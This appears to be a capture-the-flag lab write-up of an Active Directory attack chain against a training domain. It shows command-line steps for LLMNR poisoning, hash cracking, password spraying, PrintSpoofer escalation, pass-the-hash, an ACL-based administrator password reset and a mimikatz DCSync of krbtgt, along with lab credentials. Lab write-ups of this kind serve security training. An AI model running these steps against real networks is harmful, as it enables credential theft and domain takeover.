## Getting a Foothold

### Attempting LLMNR/NBT-NS Poisoning
```shell-session
$sudo responder -I ens224 
```

Poisoning succeed for user AB920, saved results to `/usr/share/responder/logs/SMB-NTLMv2-SSP-172.16.7.3.txt`.

### Cracking the Hash
```shell-session
$hashcat -m 5600 AB920_ntlm /usr/share/wordlists/rockyou.txt
```

Found credentials AB920:weasal

### Attempting to use fping to Find Live Hosts
```shell-session
$fping -asgq 172.16.6.0/23
```

### Starting Nmap Scan to find Running Services
```shell-session
$sudo nmap -A -iL hosts
```

### Connecting with RDP to MS01

#### AB920
```
xfreerdp /v:172.16.7.50 /u:AB920 /p:weasal
```

### Attempting Password Spraying agian
```
for u in $(cat validUsers);do rpcclient -U "$u%Welcom1" -c "getusername;quit" 172.16.7.50 | grep Authority; done
```

#### BR086
```
xfreerdp /v:172.16.7.50 /u:BR086 /p:Welcome1
```

### Escalating Privileges
`.\PrintSpoofer.exe -i -c cmd`

### Logging in to SQL01 as Administrator
`evil-winrm -i 172.16.7.60 -u Administrator -H bdaffbfe64f1fc646a3353be1c2c3c99`

### Connecting the MS01 with mssqlsvc 
```
proxychains xfreerdp /v:172.16.7.50 /u:'mssqlsvc'
```

### GenericAll rights for groups with CT059
![[Pasted image 20240504202533.png]]

### Changing the Administrator's Password
```
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

Set-DomainUserPassword -Identity administrator -AccountPassword $damundsenPassword -Verbose
```

Now opening PowerShell as Administrator.

### Getting the Flag
```
type \\DC01\C$\Users\Administrator\Desktop\flag.txt
```

### Using DCSync to get KRBTGTs Hash
```
PS C:\Users\CT059> .\mimikatz.exe

mimikatz # privilege::debug
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\krbtgt
```
